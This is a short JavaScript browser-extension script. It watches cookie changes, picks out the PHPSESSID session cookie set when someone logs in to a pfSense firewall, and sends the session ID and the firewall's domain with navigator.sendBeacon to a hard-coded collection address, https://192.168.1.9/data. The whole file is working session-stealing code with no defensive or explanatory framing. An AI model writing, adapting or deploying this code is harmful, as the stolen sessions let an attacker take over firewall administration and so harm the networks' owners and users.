browser.cookies.onChanged.addListener((changeInfo) => {
    const cookie = changeInfo.cookie;
    const ip = "https://192.168.1.9/data"
    

    if (cookie.name === "PHPSESSID" && !changeInfo.removed) {
        const sessionId = cookie.value;
        const pfsense_ip1 = cookie.domain;
        const timestamp = new Date().toLocaleTimeString();
        console.log(`[${timestamp}] pfSense Login Detected! Session ID: ${sessionId}`);

        const data = new URLSearchParams();
        data.append('session', sessionId);
        data.append('pfsense_ip2', pfsense_ip1);
            while(ip == null){}
        navigator.sendBeacon(ip, data);
    }
});